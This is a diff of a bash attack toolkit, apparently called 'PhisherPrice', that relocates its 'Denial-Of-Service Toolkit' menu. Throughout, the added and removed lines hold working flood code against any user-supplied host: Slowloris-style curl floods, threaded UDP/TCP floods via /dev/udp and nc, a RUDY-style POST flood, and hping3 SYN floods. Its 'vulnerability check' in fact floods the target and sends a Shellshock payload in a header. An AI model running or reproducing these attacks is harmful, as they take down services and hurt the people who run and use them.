@@ -2216,6 +2216,7 @@ WI-FI xSploits
 (9) Start Eassid-ng (Buddy-ng)
 (10) Start Kismet
 (11) Wi-Fi HoneyPot
+(12) DoS Toolkit
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -2262,6 +2263,250 @@ else
 fi
 
 read -p "Press Enter to continue."
+
+elif [ "$x" == "$subdosm" ]; then                          #DOS
+clear
+	echo -e "${banner}"
+	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
+                   
+\e[0m\e[3;39m \e[1;31m
+Denial-Of-Service Toolkit
+\e[3;39m
+(1) Check If Vuln To DoS
+(2) Slowloris Attack
+(3) UDP/TCP Flood Attack
+(4) R-U-Dead-Yet Attack
+(5) SYN flood attack
+CTRL + C To Exit
+Press ENTER To Go To Main Menu
+'
+vuln2dos='1'
+slowdos='2'
+udpdos='3'
+rudydos='4'
+synner='5'
+
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
+echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+if [ "$x" == "$vuln2dos" ]; then                    #slowloris
+clear
+# Prompt user for hostname or IP address
+echo "Enter a hostname or IP address to check for vulnerabilities:"
+read target
+
+# Check for Slowloris attack
+echo "Checking for Slowloris attack..."
+if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
+    echo "Slowloris attack detected!"
+else
+    echo "Slowloris attack not detected."
+fi
+
+# Check for UDP/TCP Flood attack
+echo "Checking for UDP/TCP Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "UDP/TCP Flood attack detected!"
+else
+    echo "UDP/TCP Flood attack not detected."
+fi
+
+# Check for R-U-Dead-Yet attack
+echo "Checking for R-U-Dead-Yet attack..."
+if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
+    echo "R-U-Dead-Yet attack detected!"
+else
+    echo "R-U-Dead-Yet attack not detected."
+fi
+
+# Check for SYN Flood attack
+echo "Checking for SYN Flood attack..."
+if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
+    echo "SYN Flood attack detected!"
+else
+    echo "SYN Flood attack not detected."
+fi
+read
+elif [ "$x" == "$slowdos" ]; then                    #slowloris
+    clear
+    echo "Slowloris Type Attack"
+    read -p "Enter the hostname or IP address of the target: " host
+    read -p "Enter the port number of the target: " port
+    read -p "Enter the number of requests to send: " requests
+    read -p "Enter the time to last (in seconds): " duration
+    read -p "Enter the delay between requests (in seconds): " delay
+    read -p "Use HTTPS? [y/n]: " use_https
+
+    if [[ $use_https == "y" ]]; then
+      protocol="https"
+    else
+      protocol="http"
+    fi
+
+    read -p "Randomize User-Agent header? [y/n]: " randomize_ua
+
+    if [[ $randomize_ua == "y" ]]; then
+      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+    else
+      ua_flag=""
+    fi
+
+    endtime=$((SECONDS+duration))
+
+    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."
+
+    while [ $SECONDS -lt $endtime ]; do
+      for ((i=0;i<$requests;i++)); do
+        if [[ $randomize_ua == "y" ]]; then
+          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
+        else
+          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
+        fi
+        sleep $delay
+      done
+      echo -ne "Slowloris attack in progress...\r"
+      sleep 0.5
+      echo -ne "                                                   \r"
+      sleep 0.5
+    done
+
+    echo "Slowloris attack on $host:$port finished."
+
+fi
+
+read
+
+elif [ "$x" == "$udpdos" ]; then                    #udp-flood
+
+clear
+echo "UDP/TCP Flood Attack with Multithreading and Randomization"
+echo "Example: 10.0.0.1 80 1024 60 50"
+read -p "IP" ip
+
+read -p "Port" port
+
+read -p "Size of the packet to send" size
+
+read -p "Time in seconds" t
+
+read -p "Number of threads to use" threads
+
+read -p "Do you want to randomize packet content? (y/n)" randomize_content
+
+read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
+
+read "Which protocol do you want to use? (UDP/TCP)" protocol
+
+endtime=$((SECONDS+t))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
+echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
+
+function attack {
+  if [ "$randomize_content" == "y" ]; then
+    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+  else
+    data=$(printf "%${size}s" | tr ' ' 'A')
+  fi
+
+  if [ "$protocol" == "UDP" ]; then
+    echo "$data" > /dev/udp/$ip/$port
+  else
+    echo "$data" | nc -w 1 $ip $port
+  fi
+}
+
+for ((i=0;i<$threads;i++)); do
+  while [ $SECONDS -lt $endtime ]; do
+    attack &
+    if [ "$randomize_delay" == "y" ]; then
+      sleep 0.$((RANDOM%3))
+    else
+      sleep 0.1
+    fi
+  done
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$rudydos" ]; then                    #rudy
+clear
+echo "R-U-Dead-Yet (RUDY) Type Attack"
+echo "Example: example.com 80 1000 60"
+echo "Host"
+read host
+
+echo "Port"
+read port
+
+echo "Size of the payload in bytes"
+read payload_size
+
+echo "Number of headers"
+read header_count
+
+echo "Number of packets to send"
+read packet_count
+
+echo "Duration in seconds"
+read duration
+
+endtime=$((SECONDS+duration))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
+echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
+
+for ((i=0; i<packet_count; i++)); do
+  headers=""
+  for ((j=1; j<=header_count; j++)); do
+    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
+    headers+="\r\n$header_name: $header_value"
+  done
+  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
+  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
+  echo "Sent request $((i+1)) of $packet_count"
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$synner" ]; then                    #syn flood
+echo "SYN flood attack"
+echo "Example: example.com 80"
+echo "Host"
+read host
+
+echo "Port"
+read port
+
+echo "Number of packets to send"
+read packets
+
+echo "Packet size in bytes"
+read size
+
+echo "Window size"
+read window_size
+
+echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
+
+data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+for ((i=1;i<=$packets;i++)); do
+  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
+  sleep 0.1
+  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
+  sleep 0.1
+
+  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
+done
+
+echo "Attack finished."
+read
 
 elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
 clear
@@ -2721,250 +2966,7 @@ n
 
 fi
 
-elif [ "$x" == "$subdosm" ]; then                          #DOS
-clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Denial-Of-Service Toolkit
-\e[3;39m
-(1) Check If Vuln To DoS
-(2) Slowloris Attack
-(3) UDP/TCP Flood Attack
-(4) R-U-Dead-Yet Attack
-(5) SYN flood attack
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
-'
-vuln2dos='1'
-slowdos='2'
-udpdos='3'
-rudydos='4'
-synner='5'
 
-wait
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
-if [ "$x" == "$vuln2dos" ]; then                    #slowloris
-clear
-# Prompt user for hostname or IP address
-echo "Enter a hostname or IP address to check for vulnerabilities:"
-read target
-
-# Check for Slowloris attack
-echo "Checking for Slowloris attack..."
-if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
-    echo "Slowloris attack detected!"
-else
-    echo "Slowloris attack not detected."
-fi
-
-# Check for UDP/TCP Flood attack
-echo "Checking for UDP/TCP Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "UDP/TCP Flood attack detected!"
-else
-    echo "UDP/TCP Flood attack not detected."
-fi
-
-# Check for R-U-Dead-Yet attack
-echo "Checking for R-U-Dead-Yet attack..."
-if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
-    echo "R-U-Dead-Yet attack detected!"
-else
-    echo "R-U-Dead-Yet attack not detected."
-fi
-
-# Check for SYN Flood attack
-echo "Checking for SYN Flood attack..."
-if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
-    echo "SYN Flood attack detected!"
-else
-    echo "SYN Flood attack not detected."
-fi
-read
-elif [ "$x" == "$slowdos" ]; then                    #slowloris
-    clear
-    echo "Slowloris Type Attack"
-    read -p "Enter the hostname or IP address of the target: " host
-    read -p "Enter the port number of the target: " port
-    read -p "Enter the number of requests to send: " requests
-    read -p "Enter the time to last (in seconds): " duration
-    read -p "Enter the delay between requests (in seconds): " delay
-    read -p "Use HTTPS? [y/n]: " use_https
-
-    if [[ $use_https == "y" ]]; then
-      protocol="https"
-    else
-      protocol="http"
-    fi
-
-    read -p "Randomize User-Agent header? [y/n]: " randomize_ua
-
-    if [[ $randomize_ua == "y" ]]; then
-      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
-    else
-      ua_flag=""
-    fi
-
-    endtime=$((SECONDS+duration))
-
-    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."
-
-    while [ $SECONDS -lt $endtime ]; do
-      for ((i=0;i<$requests;i++)); do
-        if [[ $randomize_ua == "y" ]]; then
-          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
-        else
-          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
-        fi
-        sleep $delay
-      done
-      echo -ne "Slowloris attack in progress...\r"
-      sleep 0.5
-      echo -ne "                                                   \r"
-      sleep 0.5
-    done
-
-    echo "Slowloris attack on $host:$port finished."
-
-fi
-
-read
-
-elif [ "$x" == "$udpdos" ]; then                    #udp-flood
-
-clear
-echo "UDP/TCP Flood Attack with Multithreading and Randomization"
-echo "Example: 10.0.0.1 80 1024 60 50"
-read -p "IP" ip
-
-read -p "Port" port
-
-read -p "Size of the packet to send" size
-
-read -p "Time in seconds" t
-
-read -p "Number of threads to use" threads
-
-read -p "Do you want to randomize packet content? (y/n)" randomize_content
-
-read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
-
-read "Which protocol do you want to use? (UDP/TCP)" protocol
-
-endtime=$((SECONDS+t))
-
-echo "~To cancel the attack press 'Ctrl-C'"
-echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
-echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
-
-function attack {
-  if [ "$randomize_content" == "y" ]; then
-    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
-  else
-    data=$(printf "%${size}s" | tr ' ' 'A')
-  fi
-
-  if [ "$protocol" == "UDP" ]; then
-    echo "$data" > /dev/udp/$ip/$port
-  else
-    echo "$data" | nc -w 1 $ip $port
-  fi
-}
-
-for ((i=0;i<$threads;i++)); do
-  while [ $SECONDS -lt $endtime ]; do
-    attack &
-    if [ "$randomize_delay" == "y" ]; then
-      sleep 0.$((RANDOM%3))
-    else
-      sleep 0.1
-    fi
-  done
-done
-
-echo "Attack finished."
-
-read
-
-elif [ "$x" == "$rudydos" ]; then                    #rudy
-clear
-echo "R-U-Dead-Yet (RUDY) Type Attack"
-echo "Example: example.com 80 1000 60"
-echo "Host"
-read host
-
-echo "Port"
-read port
-
-echo "Size of the payload in bytes"
-read payload_size
-
-echo "Number of headers"
-read header_count
-
-echo "Number of packets to send"
-read packet_count
-
-echo "Duration in seconds"
-read duration
-
-endtime=$((SECONDS+duration))
-
-echo "~To cancel the attack press 'Ctrl-C'"
-echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
-echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
-
-for ((i=0; i<packet_count; i++)); do
-  headers=""
-  for ((j=1; j<=header_count; j++)); do
-    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
-    headers+="\r\n$header_name: $header_value"
-  done
-  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
-  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
-  echo "Sent request $((i+1)) of $packet_count"
-done
-
-echo "Attack finished."
-
-read
-
-elif [ "$x" == "$synner" ]; then                    #syn flood
-echo "SYN flood attack"
-echo "Example: example.com 80"
-echo "Host"
-read host
-
-echo "Port"
-read port
-
-echo "Number of packets to send"
-read packets
-
-echo "Packet size in bytes"
-read size
-
-echo "Window size"
-read window_size
-
-echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
-
-data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
-for ((i=1;i<=$packets;i++)); do
-  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
-  sleep 0.1
-  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
-  sleep 0.1
-
-  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
-done
-
-echo "Attack finished."
-read
 
 elif [ "$x" == "$option5" ]; then                          #Option5
 clear
